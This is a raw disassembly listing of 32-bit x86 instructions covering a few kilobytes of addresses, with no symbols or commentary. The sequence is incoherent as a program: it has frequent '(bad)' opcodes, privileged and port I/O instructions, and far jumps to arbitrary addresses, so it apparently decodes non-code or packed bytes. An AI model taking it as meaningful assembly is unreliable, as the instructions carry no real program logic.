  41b25e:	mov    al,ds:0x34c51983
  41b263:	and    BYTE PTR [ebx+0x71],ch
  41b266:	in     al,0x6
  41b268:	sbb    edx,0xe2e281df
  41b26e:	push   ebp
  41b26f:	pop    esp
  41b270:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b271:	and    esp,edx
  41b273:	das    
  41b274:	add    DWORD PTR [edi],eax
  41b276:	push   edi
  41b277:	sbb    edx,DWORD PTR [edx]
  41b279:	mov    dl,0x84
  41b27b:	rep outs dx,BYTE PTR gs:[esi]
  41b27e:	sar    BYTE PTR [esi-0x30120a1],1
  41b284:	fmul   QWORD PTR [ebp-0x26258f82]
  41b28a:	cmp    BYTE PTR [ebx],cl
  41b28c:	jle    0x41b24f
  41b28e:	repz gs addr16 add ebx,ebx
  41b293:	test   eax,0x56e565d4
  41b298:	hlt    
  41b299:	sti    
  41b29a:	jmp    0x902344ee
  41b29f:	out    dx,al
  41b2a0:	xor    BYTE PTR [eax+0x372861f1],bh
  41b2a6:	rcl    BYTE PTR [edi],0x67
  41b2a9:	lahf   
  41b2aa:	jb     0x41b298
  41b2ac:	shr    cl,cl
  41b2ae:	aam    0x22
  41b2b0:	sub    eax,0x8c230151
  41b2b5:	sahf   
  41b2b6:	enter  0x17c4,0xea
  41b2ba:	pop    edi
  41b2bb:	(bad)  
  41b2bc:	iret   
  41b2bd:	ret    0x1296
  41b2c0:	stos   BYTE PTR es:[edi],al
  41b2c1:	cmc    
  41b2c2:	sub    DWORD PTR [eax-0x5c83023a],esi
  41b2c8:	pop    edx
  41b2c9:	dec    edi
  41b2ca:	push   esp
  41b2cb:	xchg   esp,ebp
  41b2cd:	mov    ebp,DWORD PTR [esi-0x6a]
  41b2d0:	mov    eax,0xf12ba34
  41b2d5:	sub    al,0x47
  41b2d7:	add    BYTE PTR [edx],dl
  41b2d9:	les    edi,FWORD PTR [ebx+0x56]
  41b2dc:	hlt    
  41b2dd:	stos   BYTE PTR es:[edi],al
  41b2de:	loope  0x41b2bb
  41b2e0:	mov    dl,0x52
  41b2e2:	sub    BYTE PTR [edi+0x75],ah
  41b2e5:	mov    ch,0xb2
  41b2e7:	push   edx
  41b2e8:	push   es
  41b2e9:	pop    ebp
  41b2ea:	vmresume 
  41b2ed:	out    dx,al
  41b2ee:	xor    BYTE PTR [ebp+0x3b],0x8a
  41b2f2:	cmp    BYTE PTR [esp+edi*4-0x5d],bl
  41b2f6:	cmp    ebx,DWORD PTR [esi-0x3e]
  41b2f9:	and    edx,edx
  41b2fb:	sbb    al,BYTE PTR [edx+0x6e]
  41b2fe:	jge    0x41b284
  41b300:	mov    dh,bl
  41b302:	mov    ebp,0x4e5b1c94
  41b307:	adc    eax,0x5482f6a5
  41b30c:	mov    gs,WORD PTR [ebp-0x2e758cf0]
  41b312:	outs   dx,BYTE PTR ds:[esi]
  41b313:	ret    0xca82
  41b316:	js     0x41b32b
  41b318:	pop    ss
  41b319:	aam    0x0
  41b31b:	rcl    DWORD PTR [esi+0x5d],0x3c
  41b31f:	in     eax,dx
  41b320:	cmp    eax,0xad3e0044
  41b325:	pop    ebp
  41b326:	test   al,0x45
  41b328:	pop    esi
  41b329:	adc    esi,DWORD PTR [edi]
  41b32b:	adc    DWORD PTR [edi+0x71a96828],ebx
  41b331:	scas   al,BYTE PTR es:[edi]
  41b332:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b333:	mov    ebp,ecx
  41b335:	inc    esi
  41b336:	sub    BYTE PTR [eax],ah
  41b338:	jmp    DWORD PTR [ebx+0x39]
  41b33b:	xor    BYTE PTR [eax+0x4f6bb220],dh
  41b341:	cmp    ch,al
  41b343:	adc    al,0xc8
  41b345:	and    ecx,DWORD PTR [ecx+0x5e]
  41b348:	cwde   
  41b349:	inc    edi
  41b34a:	pusha  
  41b34b:	rcr    DWORD PTR [edx+0x4d],cl
  41b34e:	cmc    
  41b34f:	loopne 0x41b36a
  41b351:	sbb    DWORD PTR es:[ecx+edx*2+0x43c7a05c],eax
  41b359:	and    eax,0xd6deb22b
  41b35e:	pop    ebp
  41b35f:	(bad)  
  41b360:	jnp    0x41b37a
  41b362:	rcl    BYTE PTR [ecx+eax*4-0x5f0c981e],0x42
  41b36a:	dec    esi
  41b36b:	inc    esi
  41b36c:	sar    DWORD PTR [edx+0x20fd8c21],0x5d
  41b373:	sbb    BYTE PTR [edi+0x7c],dl
  41b376:	shl    DWORD PTR [edx+0x53791892],1
  41b37c:	nop
  41b37d:	fsub   DWORD PTR [edx-0x34]
  41b380:	jmp    0x41b3d1
  41b382:	and    al,0xb2
  41b384:	lods   al,BYTE PTR ds:[esi]
  41b385:	inc    ecx
  41b386:	shl    BYTE PTR [eax],1
  41b388:	inc    esp
  41b389:	adc    al,0x9e
  41b38b:	dec    esi
  41b38c:	mul    BYTE PTR ds:0x7d05c77c
  41b392:	loopne 0x41b3fb
  41b394:	xchg   edi,eax
  41b395:	call   0xdd4e:0x8d9e5b29
  41b39c:	mov    edx,0x48b9b60e
  41b3a1:	ins    BYTE PTR es:[edi],dx
  41b3a2:	rcr    eax,0x2d
  41b3a5:	xchg   esp,eax
  41b3a6:	gs dec edi
  41b3a8:	push   es
  41b3a9:	adc    eax,0x5eaf526f
  41b3ae:	dec    ebp
  41b3af:	adc    BYTE PTR [edi+0x55962303],dl
  41b3b5:	mov    bh,0xb2
  41b3b7:	xor    bl,BYTE PTR cs:[edi-0x7cacdf41]
  41b3be:	pop    es
  41b3bf:	sbb    edi,ebp
  41b3c1:	out    0x76,al
  41b3c3:	lods   al,BYTE PTR ds:[esi]
  41b3c4:	adc    dh,BYTE PTR [ebp+0x17]
  41b3c7:	mov    ah,0x35
  41b3c9:	dec    eax
  41b3ca:	mov    edx,0xa4b856
  41b3cf:	and    ebx,DWORD PTR [ebx]
  41b3d1:	xchg   bh,bl
  41b3d3:	pop    edx
  41b3d4:	push   0xf737607d
  41b3d9:	in     eax,0xd2
  41b3db:	xor    eax,0xb8256e50
  41b3e0:	pop    edx
  41b3e1:	sub    eax,0xe99a8fa3
  41b3e6:	loopne 0x41b45d
  41b3e8:	xor    DWORD PTR [esi+0x793eb6c7],0x27
  41b3ef:	jg     0x41b384
  41b3f1:	fwait
  41b3f2:	ins    BYTE PTR es:[edi],dx
  41b3f3:	popf   
  41b3f4:	out    dx,eax
  41b3f5:	retf   
  41b3f6:	mov    dl,0x87
  41b3f8:	(bad)  
  41b3f9:	gs aaa 
  41b3fb:	pushf  
  41b3fc:	ss (bad) 
  41b3fe:	scas   eax,DWORD PTR es:[edi]
  41b3ff:	jns    0x41b40f
  41b401:	mov    edx,0x2b9e88e3
  41b406:	adc    ecx,DWORD PTR [ecx-0x6f341b54]
  41b40c:	shl    cl,0x11
  41b40f:	xchg   edi,edx
  41b411:	sbb    eax,0xd1911702
  41b416:	loope  0x41b475
  41b418:	gs cvtdq2ps xmm4,xmm1
  41b41c:	cmp    ebx,DWORD PTR [eax]
  41b41e:	es into 
  41b420:	gs fwait
  41b422:	push   esp
  41b423:	repz in al,0x36
  41b426:	icebp  
  41b427:	aaa    
  41b428:	xchg   ebx,eax
  41b429:	loope  0x41b471
  41b42b:	sub    bh,BYTE PTR [ecx+0x694dd769]
  41b431:	jne    0x41b463
  41b433:	jns    0x41b4a8
  41b435:	pop    ds
  41b436:	sub    BYTE PTR [edi+0x3d589f90],al
  41b43c:	cld    
  41b43d:	xchg   esp,eax
  41b43e:	inc    eax
  41b43f:	enter  0x3f8b,0x73
  41b443:	fxch   st(3)
  41b445:	outs   dx,BYTE PTR ds:[esi]
  41b446:	cs aas 
  41b448:	push   esp
  41b449:	aaa    
  41b44a:	pushw  es
  41b44c:	loop   0x41b498
  41b44e:	or     eax,ebp
  41b450:	mov    bh,0x8a
  41b452:	test   DWORD PTR [ebx],edi
  41b454:	xor    esp,DWORD PTR [edi]
  41b456:	jg     0x41b3e2
  41b458:	in     al,dx
  41b459:	in     eax,dx
  41b45a:	out    0xca,eax
  41b45c:	jge    0x41b46a
  41b45e:	aam    0x62
  41b460:	mov    ecx,0x2aa2efb0
  41b465:	fadd   DWORD PTR [edi-0x37]
  41b468:	aad    0xf8
  41b46a:	test   al,0x2b
  41b46c:	xor    cl,al
  41b46e:	xor    eax,0x28bc56e8
  41b473:	pop    ss
  41b474:	cmp    eax,0x17aeb1f
  41b479:	nop
  41b47a:	shl    esp,1
  41b47c:	(bad)  
  41b47d:	mov    eax,ds:0xd4efe1a0
  41b482:	repz jno 0x41b454
  41b485:	mov    WORD PTR [eax],cs
  41b487:	xlat   BYTE PTR ds:[ebx]
  41b488:	ror    BYTE PTR [ebp+0x15],1
  41b48b:	icebp  
  41b48c:	mov    esp,0xd0fc492e
  41b491:	sub    eax,0xf107776a
  41b496:	and    eax,0x6a465f23
  41b49b:	bound  ebx,QWORD PTR [eax-0x68]
  41b49e:	or     eax,0x47926732
  41b4a3:	xchg   edx,eax
  41b4a4:	add    eax,0x71f2e4f6
  41b4aa:	sub    DWORD PTR [edx],edx
  41b4ac:	ins    BYTE PTR es:[edi],dx
  41b4ad:	sbb    al,0x6
  41b4af:	jmp    0x6425:0x57a08921
  41b4b6:	push   es
  41b4b7:	sbb    cl,bl
  41b4b9:	ret    
  41b4ba:	and    ebx,esi
  41b4bc:	es cmp al,0x5c
  41b4bf:	add    al,0x48
  41b4c1:	outs   dx,DWORD PTR ds:[esi]
  41b4c2:	inc    edx
  41b4c3:	and    BYTE PTR [ebx-0x40d7b820],al
  41b4c9:	jo     0x41b4c8
  41b4cb:	scas   eax,DWORD PTR es:[edi]
  41b4cc:	xchg   edx,eax
  41b4cd:	hlt    
  41b4ce:	mov    dl,0x88
  41b4d0:	mov    ch,al
  41b4d2:	add    ch,BYTE PTR [edi]
  41b4d4:	xor    dh,dl
  41b4d6:	movlps xmm6,QWORD PTR [esi+0x5b]
  41b4da:	xor    ch,al
  41b4dc:	mov    bl,0xcc
  41b4de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4df:	out    dx,eax
  41b4e0:	sub    al,0x85
  41b4e2:	or     BYTE PTR es:[ebx-0x691974f3],dl
  41b4e9:	push   edx
  41b4ea:	fldenv [esi+0xa115108]
  41b4f0:	jmp    0x41b4c5
  41b4f2:	ss push ecx
  41b4f4:	or     DWORD PTR [edx-0x3a],esi
  41b4f7:	or     edi,eax
  41b4f9:	mov    dh,0xf8
  41b4fb:	dec    ebp
  41b4fc:	fimul  WORD PTR [eax]
  41b4fe:	aas    
  41b4ff:	mov    DWORD PTR [edi],0x3b67cd2a
  41b505:	xor    eax,0x994c273d
  41b50a:	test   al,0xe0
  41b50c:	adc    bl,ch
  41b50e:	cmp    esi,DWORD PTR [edx+0x4cdfe7b0]
  41b514:	jb     0x41b4e9
  41b516:	nop
  41b517:	mov    bh,0x59
  41b519:	fistp  WORD PTR [edx+0x6680d1d5]
  41b51f:	js     0x41b4ff
  41b521:	xor    ebx,DWORD PTR [ecx]
  41b523:	inc    edi
  41b524:	and    ecx,DWORD PTR [ebx-0x21]
  41b527:	aam    0xb
  41b529:	lods   eax,DWORD PTR ds:[esi]
  41b52a:	mov    ?,WORD PTR [ebx]
  41b52c:	sub    DWORD PTR [ecx+eiz*8-0x7c0eb554],0x8c241e29
  41b537:	ret    0x47e4
  41b53a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b53b:	inc    edi
  41b53c:	jle    0x41b59e
  41b53e:	add    ebp,DWORD PTR [esi+0x31]
  41b541:	bound  edi,QWORD PTR [eax]
  41b543:	xor    al,BYTE PTR [ecx+0x2c]
  41b546:	scas   al,BYTE PTR es:[edi]
  41b547:	push   edx
  41b548:	sahf   
  41b549:	jbe    0x41b507
  41b54b:	mov    bh,0x49
  41b54e:	push   es
  41b54f:	cmc    
  41b550:	outs   dx,DWORD PTR ds:[esi]
  41b551:	and    ch,BYTE PTR [edx-0x4637d7d2]
  41b557:	(bad)  
  41b558:	xchg   ebx,eax
  41b559:	jp     0x41b522
  41b55b:	data16 jg 0x41b543
  41b55e:	test   esp,esp
  41b560:	mov    al,0x40
  41b562:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b563:	push   eax
  41b564:	inc    edx
  41b565:	or     ebx,esi
  41b567:	in     al,0x5
  41b569:	add    ebp,DWORD PTR [eax+0x4684f645]
  41b56f:	mov    gs,WORD PTR [ecx+0x5e8c30b0]
  41b575:	pop    ecx
  41b576:	xchg   ebx,eax
  41b577:	mov    al,ds:0x1f2c98a3
  41b57c:	imul   esp,DWORD PTR [esi+0x26],0xd
  41b580:	shr    ecx,0x3d
  41b583:	and    eax,0xdb1b3313
  41b588:	sub    esi,DWORD PTR [ecx+edx*1+0x39f57e2d]
  41b58f:	pop    esp
  41b590:	inc    esi
  41b591:	clc    
  41b592:	mov    ecx,0x6d86c038
  41b597:	mov    dh,0xc
  41b599:	mov    esi,DWORD PTR [ecx-0x552d8f8a]
  41b59f:	and    eax,esi
  41b5a1:	adc    edi,0x33750956
  41b5a7:	adc    esi,esp
  41b5a9:	outs   dx,DWORD PTR ds:[esi]
  41b5aa:	inc    ebp
  41b5ab:	sahf   
  41b5ac:	jge    0x41b54f
  41b5ae:	ins    DWORD PTR es:[edi],dx
  41b5af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5b0:	sahf   
  41b5b1:	rcl    BYTE PTR [edi-0x30],1
  41b5b4:	jne    0x41b5e0
  41b5b6:	and    esp,DWORD PTR [edi]
  41b5b8:	inc    edx
  41b5b9:	sub    BYTE PTR [ebx+0x4d9ba875],dh
  41b5bf:	pop    edi
  41b5c0:	sbb    eax,0xd5bca71
  41b5c5:	(bad)  
  41b5c7:	sbb    al,BYTE PTR [edi+edi*4]
  41b5ca:	stc    
  41b5cb:	sbb    bh,BYTE PTR ds:0xb6727592
  41b5d1:	into   
  41b5d2:	popf   
  41b5d3:	out    0xa,eax
  41b5d5:	dec    edi
  41b5d6:	and    ch,dl
  41b5d8:	and    BYTE PTR [ebx+0x746016cd],dh
  41b5de:	mov    ah,0xbc
  41b5e0:	add    BYTE PTR [esi-0x72],cl
  41b5e3:	pop    ds
  41b5e4:	or     eax,0x22def5ac
  41b5e9:	mov    BYTE PTR [esi+0x4f1f36f6],bl
  41b5ef:	pusha  
  41b5f0:	pop    ecx
  41b5f1:	test   al,0x34
  41b5f3:	shr    ebx,cl
  41b5f5:	retf   0xb13
  41b5f8:	je     0x41b61c
  41b5fa:	add    al,0x4c
  41b5fc:	inc    edx
  41b5fd:	cmp    al,0xf
  41b5ff:	lds    eax,FWORD PTR [ecx]
  41b601:	sub    eax,0x9bccc91d
  41b606:	ror    BYTE PTR [ebx+0x31],cl
  41b609:	and    BYTE PTR [esi+0x149d9a3],0x4e
  41b610:	jl     0x41b5da
  41b612:	(bad)  
  41b613:	pop    esp
  41b614:	cmp    cl,BYTE PTR [ebp+0x326ae338]
  41b61a:	mov    bh,0x72
  41b61c:	cs push edx
  41b61e:	sbb    eax,0x3d0f6dc1
  41b623:	jno    0x41b63a
  41b625:	cmp    ah,BYTE PTR [edi]
  41b627:	sub    DWORD PTR ds:0xc358b579,edi
  41b62d:	pop    edx
  41b62e:	in     eax,0x11
  41b630:	std    
  41b631:	rol    BYTE PTR [edi-0x5d],cl
  41b634:	jp     0x41b62f
  41b636:	and    DWORD PTR [edi],edx
  41b638:	jnp    0x41b69c
  41b63a:	imul   edx,ebx,0x19a94bd4
  41b640:	cwde   
  41b641:	jb     0x41b655
  41b643:	mov    DWORD PTR [ecx-0x2883f56e],esp
  41b649:	sub    BYTE PTR [esi+0x6d6d0b65],0x46
  41b650:	inc    esp
  41b651:	jns    0x41b684
  41b653:	xchg   ecx,esi
  41b655:	xchg   ebp,esp
  41b657:	pop    ss
  41b658:	xor    DWORD PTR [eax],ebp
  41b65a:	jg     0x41b5e0
  41b65c:	or     BYTE PTR [edi],cl
  41b65e:	gs add dl,dh
  41b661:	cwde   
  41b662:	push   eax
  41b663:	pusha  
  41b664:	into   
  41b665:	inc    esi
  41b666:	and    ah,BYTE PTR [esi-0x5]
  41b669:	sub    dh,BYTE PTR [ecx]
  41b66b:	or     eax,0xa392e3d2
  41b670:	xor    BYTE PTR [eax-0x3bcc1c97],dl
  41b676:	data16 jae 0x41b647
  41b679:	xchg   edx,eax
  41b67a:	mov    edi,0x68b1e95d
  41b67f:	pop    ebp
  41b680:	sub    BYTE PTR [edi+0xece6d8c],ch
  41b686:	sub    DWORD PTR [eax],esi
  41b688:	repz xchg ebp,eax
  41b68a:	inc    esp
  41b68b:	icebp  
  41b68c:	imul   esi,DWORD PTR [edi+esi*4],0x6cf30a28
  41b693:	outs   dx,DWORD PTR ds:[esi]
  41b694:	jbe    0x41b6c7
  41b696:	jno    0x41b709
  41b698:	pop    ebx
  41b699:	jmp    0xfffc0079
  41b69e:	xchg   edi,eax
  41b69f:	jns    0x41b700
  41b6a1:	mov    ch,0xbb
  41b6a3:	xor    al,0x54
  41b6a5:	sti    
  41b6a6:	dec    edx
  41b6a7:	retf   
  41b6a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6a9:	jmp    0x41b6ed
  41b6ab:	dec    ecx
  41b6ac:	imul   ebx,DWORD PTR [edi+ecx*1],0xffffff82
  41b6b0:	out    0x72,eax
  41b6b2:	add    BYTE PTR [eax],al
  41b6b4:	mov    edx,DWORD PTR [ebp-0x28]
  41b6b7:	mov    edi,DWORD PTR [ebp-0x4]
  41b6ba:	jmp    0x41bbcc
  41b6bf:	into   
  41b6c0:	iret   
  41b6c1:	iret   
  41b6c2:	cmp    al,0xcd
  41b6c4:	cmp    al,0xd1
  41b6c6:	shl    edi,1
  41b6c8:	aad    0x3b
  41b6ca:	je     0x41b710
  41b6cc:	push   esi
  41b6cd:	sti    
  41b6ce:	sub    DWORD PTR [eax-0x74],eax
  41b6d1:	jg     0x41b74b
  41b6d3:	jae    0x41b751
  41b6d5:	js     0x41b74f
  41b6d7:	jae    0x41b6ec
  41b6d9:	adc    DWORD PTR [esi+0x40fa8bbc],0x59
  41b6e0:	mov    ah,0x28
  41b6e2:	in     eax,dx
  41b6e3:	ucomiss xmm2,xmm7
  41b6e6:	and    bl,BYTE PTR [ebx]
  41b6e8:	and    DWORD PTR [esi-0x26],0x21
  41b6ec:	add    BYTE PTR [esi+edi*2+0x1d],bh
  41b6f0:	push   esp
  41b6f1:	add    DWORD PTR [edi-0x80],ebp
  41b6f4:	pop    ebx
  41b6f5:	(bad)  
  41b6f6:	mov    ecx,0x43bf4cae
  41b6fb:	mov    bh,0xfb
  41b6fd:	adc    BYTE PTR [esi+0x5f],bl
  41b700:	retf   
  41b701:	ds loope 0x41b709
  41b704:	jae    0x41b745
  41b706:	dec    eax
  41b707:	cdq    
  41b708:	fbld   TBYTE PTR [eax]
  41b70a:	xor    DWORD PTR [edx],ecx
  41b70c:	xor    BYTE PTR [edx],ch
  41b70e:	adc    BYTE PTR [edi-0x37],al
  41b711:	pop    eax
  41b712:	or     DWORD PTR [ecx-0x56761e05],edi
  41b718:	ins    DWORD PTR es:[edi],dx
  41b719:	mov    WORD PTR [edi],es
  41b71b:	mov    esp,0x79ede595
  41b720:	inc    esi
  41b721:	mov    ah,0x52
  41b723:	scas   al,BYTE PTR es:[edi]
  41b724:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b725:	(bad)  
  41b727:	je     0x41b763
  41b729:	lock fst DWORD PTR [ebx+eax*2-0x7d]
  41b72e:	add    edx,DWORD PTR [ecx]
  41b730:	add    esi,ecx
  41b732:	push   cs
  41b733:	retf   
  41b734:	jne    0x41b6fa
  41b736:	cs pop esp
  41b738:	mov    DWORD PTR [ebp+0x7b6a9914],eax
  41b73e:	leave  
  41b73f:	pop    edx
  41b740:	push   esp
  41b741:	fcmovnu st,st(1)
  41b743:	pop    ecx
  41b744:	loopne 0x41b73d
  41b746:	lods   al,BYTE PTR ds:[esi]
  41b747:	and    DWORD PTR [ebp+0x2],ecx
  41b74a:	stc    
  41b74b:	mov    WORD PTR [esi+ecx*8-0x2d235c28],gs
  41b752:	sub    bl,BYTE PTR [ebx+ebx*2]
  41b755:	ret    
  41b756:	xchg   ebx,eax
  41b757:	clc    
  41b758:	jb     0x41b714
  41b75a:	repnz sub al,0xad
  41b75d:	push   edx
  41b75e:	fs pushw 0xff99
  41b762:	repnz in al,dx
  41b764:	mov    bh,0x7c
  41b766:	pop    ebp
  41b767:	jb     0x41b7ab
  41b769:	or     eax,0xd9c52bdd
  41b76e:	stos   BYTE PTR es:[di],al
  41b770:	adc    bl,dl
  41b772:	mov    al,ds:0x3c3d4476
  41b777:	pop    esi
  41b778:	out    dx,eax
  41b779:	xchg   esi,eax
  41b77a:	pop    ds
  41b77b:	scas   eax,DWORD PTR es:[edi]
  41b77c:	xlat   BYTE PTR ds:[ebx]
  41b77d:	div    bl
  41b77f:	lahf   
  41b780:	test   ecx,edx
  41b782:	test   al,0x34
  41b784:	int    0xe4
  41b786:	mov    BYTE PTR [ecx-0x7e],ah
  41b789:	inc    edx
  41b78a:	ret    0x1f44
  41b78d:	(bad)  
  41b78e:	clc    
  41b78f:	mov    WORD PTR [edi],cs
  41b791:	sbb    BYTE PTR [ebx-0x26],cl
  41b794:	adc    eax,0x23418d1a
  41b799:	mov    dh,0xca
  41b79b:	cmp    eax,0x3ded9d64
  41b7a0:	adc    edx,DWORD PTR [ecx]
  41b7a2:	mov    ds:0x5830cbff,al
  41b7a7:	xchg   ebp,eax
  41b7a8:	cmp    ecx,DWORD PTR [ecx+0x23]
  41b7ab:	jle    0x41b7ac
  41b7ad:	pop    edi
  41b7ae:	mul    DWORD PTR [esi]
  41b7b0:	out    dx,eax
  41b7b1:	(bad)  
  41b7b2:	fnstcw WORD PTR [ebp-0x31]
  41b7b5:	lock or al,0x1e
  41b7b8:	in     eax,0x93
  41b7ba:	aas    
  41b7bb:	rcl    BYTE PTR ds:0xd4d9a8a4,1
  41b7c1:	repnz icebp 
  41b7c3:	shl    BYTE PTR [edx],cl
  41b7c5:	push   eax
  41b7c6:	inc    ebp
  41b7c7:	inc    esp
  41b7c8:	in     al,dx
  41b7c9:	mov    dl,0xb
  41b7cb:	sub    al,0x3a
  41b7cd:	mov    ebp,0xd3482426
  41b7d2:	stos   DWORD PTR es:[edi],eax
  41b7d3:	mov    al,ds:0x49e44c70
  41b7d8:	(bad)  
  41b7d9:	shr    BYTE PTR [esi],cl
  41b7db:	push   ecx
  41b7dc:	pop    es
  41b7dd:	cmc    
  41b7de:	jl     0x41b7fa
  41b7e0:	pop    eax
  41b7e1:	icebp  
  41b7e2:	out    0x0,al
  41b7e4:	aaa    
  41b7e5:	gs or  eax,0x462ee15d
  41b7eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7ec:	jecxz  0x41b7df
  41b7ee:	call   0x5daf59b1
  41b7f3:	call   0xf259ef29
  41b7f8:	gs mov eax,0xf70b578f
  41b7fe:	push   ebx
  41b7ff:	xchg   BYTE PTR [ebp-0x67e2c973],dh
  41b805:	jl     0x41b7a3
  41b807:	inc    ecx
  41b808:	icebp  
  41b809:	xchg   esp,eax
  41b80a:	and    eax,0xbd5ac6e5
  41b80f:	dec    ebp
  41b810:	dec    ebp
  41b811:	call   0xbf9c940e
  41b816:	cmp    al,0xd3
  41b818:	dec    edx
  41b819:	adc    al,0x30
  41b81b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b81c:	add    al,0xda
  41b81e:	sahf   
  41b81f:	mov    ecx,0x4192ea3d
  41b824:	xchg   ebx,eax
  41b825:	push   ecx
  41b826:	sub    al,0x26
  41b828:	shr    bl,cl
  41b82a:	shl    DWORD PTR [ebx-0x73],1
  41b82d:	hlt    
  41b82e:	aaa    
  41b82f:	dec    eax
  41b830:	clc    
  41b831:	(bad)  
  41b832:	fadd   st,st(6)
  41b834:	fnstsw WORD PTR ds:0x789d8673
  41b83a:	call   0x1826b254
  41b83f:	pop    ebx
  41b840:	pop    es
  41b841:	xor    DWORD PTR [eax+ebx*8+0x64],esi
  41b845:	rol    DWORD PTR [edx+0x3e],cl
  41b848:	out    dx,al
  41b849:	inc    eax
  41b84a:	ins    BYTE PTR es:[edi],dx
  41b84b:	jmp    0x41b88b
  41b84d:	push   eax
  41b84e:	imul   ebp,edi,0x4c
  41b851:	cwde   
  41b852:	ja     0x41b839
  41b854:	fild   DWORD PTR [eax]
  41b856:	jo     0x41b830
  41b858:	(bad)  
  41b859:	mov    ebx,0xc52b19d5
  41b85e:	jmp    0x8f92:0x587c891d
  41b865:	vaddpd ymm0,ymm4,ymm6
  41b869:	sub    bh,BYTE PTR [eax]
  41b86b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b86c:	and    al,0x81
  41b86e:	pushf  
  41b86f:	shl    DWORD PTR [edx],0xd
  41b872:	jmp    0xf9d71d80
  41b877:	(bad)  
  41b878:	fsubr  DWORD PTR [eax-0x3a444319]
  41b87e:	xor    bl,BYTE PTR [ebx]
  41b880:	cmp    al,0x9b
  41b882:	cmp    ah,BYTE PTR [ebp+0x59]
  41b885:	pushf  
  41b886:	jmp    0x7eebad05
  41b88b:	jno    0x41b8fd
  41b88d:	idiv   esi
  41b88f:	xor    DWORD PTR [edx],esi
  41b891:	jns    0x41b90e
  41b893:	scas   al,BYTE PTR es:[edi]
  41b894:	push   ss
  41b895:	adc    esi,ebp
  41b897:	xchg   ecx,eax
  41b898:	xor    eax,0x5350997b
  41b89d:	es mov esp,0x63e05691
  41b8a3:	jge    0x41b8b5
  41b8a5:	sub    BYTE PTR [edx],dl
  41b8a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8a8:	pop    esp
  41b8a9:	xchg   ebx,eax
  41b8aa:	in     eax,dx
  41b8ab:	cmp    al,0x22
  41b8ad:	scas   al,BYTE PTR es:[edi]
  41b8ae:	retf   0xd58
  41b8b1:	sbb    al,0x20
  41b8b3:	mov    ebx,DWORD PTR [edi+eiz*2]
  41b8b6:	lods   al,BYTE PTR ds:[esi]
  41b8b7:	push   edx
  41b8b8:	push   ebx
  41b8b9:	xor    eax,0xa866b42
  41b8be:	xlat   BYTE PTR ds:[ebx]
  41b8bf:	and    eax,0xfa837840
  41b8c4:	loop   0x41b8f0
  41b8c6:	push   ebp
  41b8c7:	cmc    
  41b8c8:	mov    edx,0xd55397c0
  41b8cd:	sahf   
  41b8ce:	outs   dx,DWORD PTR ds:[esi]
  41b8cf:	(bad)  
  41b8d0:	lock ror esi,cl
  41b8d3:	xor    DWORD PTR es:[ecx-0x2a],ebp
  41b8d7:	iret   
  41b8d8:	iret   
  41b8d9:	or     eax,DWORD PTR [eax+ebx*8-0x3b2794af]
  41b8e0:	sub    al,0xb1
  41b8e2:	test   DWORD PTR [esi],edx
  41b8e4:	cwde   
  41b8e5:	fmul   st(7),st
  41b8e7:	xchg   edx,eax
  41b8e8:	clc    
  41b8e9:	pop    eax
  41b8ea:	mov    ds:0x9b20ab44,al
  41b8ef:	and    edx,esi
  41b8f1:	push   eax
  41b8f2:	mov    ch,BYTE PTR [edx+0x60]
  41b8f5:	or     eax,0x7040f23f
  41b8fa:	lds    esp,FWORD PTR [edx+0x45599b68]
  41b900:	xchg   esp,eax
  41b901:	std    
  41b902:	stos   DWORD PTR es:[edi],eax
  41b903:	xor    ah,BYTE PTR [eax+edi*1+0x71]
  41b907:	popa   
  41b908:	xchg   BYTE PTR [edx+0x5238e748],bl
  41b90e:	cmp    eax,0xf0f9ed63
  41b913:	sub    eax,0x5e790e97
  41b918:	jnp    0x41b965
  41b91a:	mov    dl,BYTE PTR [eax+0x1c]
  41b91d:	jae    0x41b90a
  41b91f:	inc    esi
  41b920:	pop    esi
  41b921:	mov    al,0xff
  41b923:	out    dx,eax
  41b924:	shr    DWORD PTR [esi-0x2c591090],cl
  41b92a:	xchg   ebp,eax
  41b92b:	cmc    
  41b92c:	jmp    0x6f839444
  41b931:	lds    ebx,FWORD PTR [eax-0x5b]
  41b934:	jmp    0x9855:0xc4d3827f
  41b93b:	inc    edx
  41b93c:	je     0x41b989
  41b93e:	cwde   
  41b93f:	ret    0x162
  41b942:	aaa    
  41b943:	inc    ecx
  41b944:	xchg   edx,eax
  41b945:	and    ecx,DWORD PTR [esi-0x10]
  41b948:	push   ebx
  41b949:	out    dx,eax
  41b94a:	inc    ebx
  41b94b:	out    0x3f,al
  41b94d:	rcl    edi,0x9e
  41b950:	mov    ch,0x8e
  41b952:	mov    bl,0x43
  41b954:	pop    esp
  41b955:	xor    dl,BYTE PTR [eax-0x37d6e823]
  41b95b:	bound  edx,QWORD PTR [ecx+esi*1-0x3bcae652]
  41b962:	adc    al,0xdc
  41b964:	call   0x6bc0:0x268c7140
  41b96b:	js     0x41b98a
  41b96d:	ret    0x92ad
  41b970:	lahf   
  41b971:	adc    eax,esi
  41b973:	mov    fs,WORD PTR [edi+ecx*1-0x30]
  41b977:	retf   
  41b978:	iret   
  41b979:	push   ss
  41b97a:	test   DWORD PTR [edi-0x604ccdd8],0x9bb3aa87
  41b984:	jnp    0x41b9d5
  41b986:	push   edi
  41b987:	push   edi
  41b988:	nop
  41b989:	sbb    DWORD PTR [edi-0x443e5953],ebp
  41b98f:	and    dl,BYTE PTR [eax+ebx*8-0x7c]
  41b993:	and    BYTE PTR [edi-0x1a],ch
  41b996:	fcmovne st,st(6)
  41b998:	cmp    edx,DWORD PTR [ebp+eax*4-0x7d]
  41b99c:	mov    edi,0xace77577
  41b9a1:	cwde   
  41b9a2:	cld    
  41b9a3:	mov    ?,WORD PTR [esi+ebp*4-0x52]
  41b9a7:	adc    eax,0x76f0bd5a
